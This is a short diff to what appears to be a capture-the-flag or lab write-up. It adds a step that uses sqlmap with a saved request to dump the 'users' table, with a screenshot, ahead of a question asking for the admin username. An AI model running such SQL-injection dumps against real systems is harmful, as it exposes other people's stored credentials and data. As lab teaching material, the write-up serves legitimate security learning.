@@ -89,6 +89,14 @@ Mmmh... interesting we found some databases :)
 
 ![sqlmap 2](https://user-images.githubusercontent.com/67475596/103477797-592c4600-4dc2-11eb-98a8-ae36a56d3c15.png)
 
+Let's check "users"
+
+```bash
+sqlmap -r request.txt -D users -T users --dump
+```
+
+![sqlmap 3](https://user-images.githubusercontent.com/67475596/103477822-9a245a80-4dc2-11eb-9629-02cb1b129a2b.png)
+
 
 **Question 1:** What is the admin username? <br>
 
